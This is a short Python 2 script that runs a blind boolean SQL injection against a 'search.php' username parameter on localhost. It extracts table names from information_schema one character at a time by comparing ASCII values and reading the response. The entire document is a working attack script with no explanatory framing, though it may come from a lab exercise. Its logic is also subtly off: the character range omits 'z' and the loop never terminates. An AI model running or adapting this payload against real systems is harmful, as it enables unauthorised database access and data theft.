#!/usr/bin/python
import requests
import string
import time

url = "http://localhost/search.php?username="

position=1
while True:
    for i in range(97,122):
        payload = "cyber' and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),"+str(position)+",1))>"+str(i)+" -- # &password=changed&login=login"
        res = requests.get(url+payload)
        time.sleep(1)
        if "id" not in res.content:
            position+=1
            print chr(i)
            break
